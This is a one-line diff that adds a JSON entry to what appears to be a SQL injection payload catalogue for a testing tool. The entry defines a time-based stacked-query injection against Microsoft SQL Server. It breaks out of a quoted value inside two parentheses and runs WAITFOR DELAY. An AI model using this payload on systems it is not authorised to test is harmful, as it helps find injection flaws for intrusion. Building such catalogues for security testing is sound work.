@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "stacked", "boundary": {"prefix": "'))", "suffix": "-- -", "type": "paren2-single"}, "vector": "{B}; SELECT WAITFOR DELAY '0:0:5'", "comment": "mssql stacked: single in 2 parens"}
